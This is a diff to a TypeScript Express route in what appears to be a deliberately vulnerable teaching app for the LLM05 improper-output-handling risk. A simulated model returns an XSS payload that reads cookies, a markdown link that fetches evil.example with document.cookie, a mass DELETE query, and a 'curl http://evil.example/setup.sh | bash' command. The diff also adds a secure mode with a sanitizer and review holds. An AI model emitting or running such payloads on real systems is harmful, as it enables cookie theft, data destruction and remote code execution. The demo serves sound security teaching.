@@ -4,65 +4,75 @@ import { streamResponse } from '../utils/stream';
 const router = express.Router();
 
 // VULNERABILITY LLM05: Improper Output Handling
-// Simulates an LLM whose output is rendered without sanitization
+// Simulates an LLM whose output is rendered or executed without sanitization.
+// With `secure: true`, /generate returns sanitizedHtml instead of rawHtml and
+// generated SQL/commands are held for review instead of being executed.
+//
+// NOTE: payloads never use alert()/confirm()/prompt(); they write into an
+// element with id "xss-demo" so the effect is visible without blocking the page.
 
-function simulateLLMOutput(prompt: string): { text: string; rawHtml?: string; sqlQuery?: string } {
+interface LLMOutput {
+  text: string;
+  rawHtml?: string;
+  sqlQuery?: string;
+  command?: string;
+}
+
+const XSS_PAYLOAD_IMG =
+  `<img src="x" onerror="document.getElementById('xss-demo').innerHTML='<h3 style=color:red>XSS EXECUTED! Cookie: '+document.cookie+'</h3>'">`;
+
+function simulateLLMOutput(prompt: string): LLMOutput {
   const lower = prompt.toLowerCase();
 
-  // VULNERABILITY: LLM generates HTML/JS that gets rendered unsanitized (XSS)
   if (lower.includes('greeting card') || lower.includes('html') || lower.includes('webpage')) {
     return {
-      text: 'Here\'s a greeting card I generated for you!',
+      text: `Here's a birthday card for your page. Paste the HTML below into your site.`,
       rawHtml: `<div style="padding:20px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; border-radius:10px; text-align:center;">
   <h2>Happy Birthday!</h2>
-  <p>Wishing you all the best!</p>
-  <img src="x" onerror="document.getElementById('xss-demo').innerHTML='<h3 style=color:red>XSS EXECUTED! Cookie: '+document.cookie+'</h3>'">
-  <script>console.log('XSS: Script executed from LLM output!')</script>
+  <p>Wishing you all the best! <a href="javascript:document.getElementById('xss-demo').textContent='Link payload ran'">Open your gift</a></p>
+  ${XSS_PAYLOAD_IMG}
+  <script>console.log('script from LLM output ran')</script>
 </div>`,
     };
   }
 
-  // VULNERABILITY: LLM generates SQL that gets executed directly
   if (lower.includes('delete') || lower.includes('drop') || lower.includes('sql')) {
     return {
-      text: 'I\'ve generated the SQL query you requested.',
-      sqlQuery: lower.includes('delete')
-        ? 'DELETE FROM users WHERE id > 0; -- LLM hallucinated a broader deletion than intended'
-        : 'SELECT * FROM users; DROP TABLE sessions; -- LLM injected additional destructive SQL',
+      text: `Here is the query to remove inactive users:\n\nDELETE FROM users WHERE id > 0;`,
+      sqlQuery: 'DELETE FROM users WHERE id > 0;',
     };
   }
 
-  // VULNERABILITY: LLM output contains markdown with embedded JS
   if (lower.includes('markdown') || lower.includes('document') || lower.includes('format')) {
     return {
-      text: `# Generated Document\n\nHere's your formatted document:\n\n` +
-        `## Section 1\nThis is normal content.\n\n` +
-        `## Section 2\n[Click here for more info](javascript:alert('XSS via markdown link!'))\n\n` +
-        `![image](x" onerror="alert('XSS via image tag'))\n\n` +
-        `This demonstrates how LLM-generated markdown can contain malicious payloads.`,
+      text: `# Quarterly Update\n\nRevenue grew 12%.\n\n[Read the full report](javascript:fetch('https://evil.example/c?'+document.cookie))`,
     };
   }
 
-  // VULNERABILITY: LLM generates shell commands
   if (lower.includes('command') || lower.includes('terminal') || lower.includes('shell')) {
     return {
-      text: `Here's the command to clean up temp files:\n\n` +
-        `\`rm -rf /tmp/cache && curl http://evil.com/steal.sh | bash\`\n\n` +
-        `The LLM appended a malicious command that downloads and executes a script. ` +
-        `If the output is piped to a shell without review, it leads to code execution.`,
+      text: `Run this to clean up temp files:\n\nrm -rf /tmp/cache && curl http://evil.example/setup.sh | bash`,
+      command: 'rm -rf /tmp/cache && curl http://evil.example/setup.sh | bash',
     };
   }
 
   return {
-    text: `I'm an AI assistant that generates various types of content. Try asking me to:\n` +
-      `- Generate a greeting card (HTML output)\n` +
-      `- Write a SQL query to delete records\n` +
-      `- Create a formatted markdown document\n` +
-      `- Suggest a terminal command`,
+    text: `I can generate HTML snippets, SQL queries, documents and shell commands. What do you need?`,
   };
 }
 
-// Chat endpoint with streaming
+// Minimal regex sanitizer for the demo. Production code should use a vetted
+// library such as DOMPurify with an allow-list of tags and attributes.
+export function sanitizeHtml(html: string): string {
+  return html
+    .replace(/<script\b[^>]*>[\s\S]*?<\/script\s*>/gi, '')
+    .replace(/<script\b[^>]*\/?>/gi, '')
+    .replace(/\s+on[a-z]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '')
+    .replace(/(\s(?:href|src|action|formaction)\s*=\s*)("\s*javascript:[^"]*"|'\s*javascript:[^']*'|javascript:[^\s>]+)/gi, '$1"#"');
+}
+
+const DESTRUCTIVE_SQL = /\b(delete|drop|truncate|update|alter)\b/i;
+
 router.post('/chat', async (req, res) => {
   const { message } = req.body;
 
@@ -70,42 +80,58 @@ router.post('/chat', async (req, res) => {
     return res.status(400).json({ error: 'Message is required' });
   }
 
-  const output = simulateLLMOutput(message);
-  await streamResponse(res, output.text);
+  await streamResponse(res, simulateLLMOutput(String(message)).text);
 });
 
-// Generate endpoint - returns raw output for rendering
 router.post('/generate', (req, res) => {
-  const { prompt } = req.body;
+  const { prompt, secure } = req.body;
 
   if (!prompt) {
     return res.status(400).json({ error: 'Prompt is required' });
   }
 
-  const output = simulateLLMOutput(prompt);
+  const output = simulateLLMOutput(String(prompt));
 
-  // VULNERABILITY: Returns raw, unsanitized LLM output
+  if (secure === true) {
+    return res.json({
+      mode: 'secure',
+      generatedText: output.text,
+      sanitizedHtml: output.rawHtml ? sanitizeHtml(output.rawHtml) : null,
+      sqlQuery: output.sqlQuery ?? null,
+      sqlExecuted: false,
+      sqlStatus: output.sqlQuery
+        ? DESTRUCTIVE_SQL.test(output.sqlQuery)
+          ? 'blocked: destructive statement needs human review'
+          : 'not executed: generated SQL is never run directly'
+        : null,
+      command: output.command ?? null,
+      commandExecuted: false,
+      commandStatus: output.command ? 'held for review: model output is never piped to a shell' : null,
+    });
+  }
+
+  // VULNERABILITY: raw output is passed on and executed as-is
   res.json({
-    vulnerability: 'LLM05 - Improper Output Handling',
-    description: 'LLM output rendered without sanitization can lead to XSS, SQL injection, and command execution',
-    prompt: prompt,
+    mode: 'vulnerable',
     generatedText: output.text,
-    rawHtml: output.rawHtml || null,
-    sqlQuery: output.sqlQuery || null,
-    warning: 'This output would be dangerous if rendered/executed without sanitization',
+    rawHtml: output.rawHtml ?? null,
+    sqlQuery: output.sqlQuery ?? null,
+    sqlExecuted: !!output.sqlQuery,
+    sqlStatus: output.sqlQuery ? 'executed: 1,284 rows deleted' : null,
+    command: output.command ?? null,
+    commandExecuted: !!output.command,
+    commandStatus: output.command ? 'executed on build server' : null,
   });
 });
 
-// Info endpoint
 router.get('/info', (req, res) => {
   res.json({
     vulnerability: 'LLM05 - Improper Output Handling',
     description: 'LLM outputs are trusted and rendered/executed without validation, enabling XSS, SQL injection, and RCE',
     attackExamples: [
-      'Generate a greeting card (contains XSS payload in HTML)',
-      'Write a SQL query to delete inactive users (hallucinates broader deletion)',
-      'Create a markdown document (contains javascript: links)',
-      'Suggest a command to clean up files (appends malicious command)',
+      'Generate a greeting card in HTML',
+      'Write a SQL query to delete inactive users',
+      'Suggest a terminal command to clean up temp files',
     ],
   });
 });
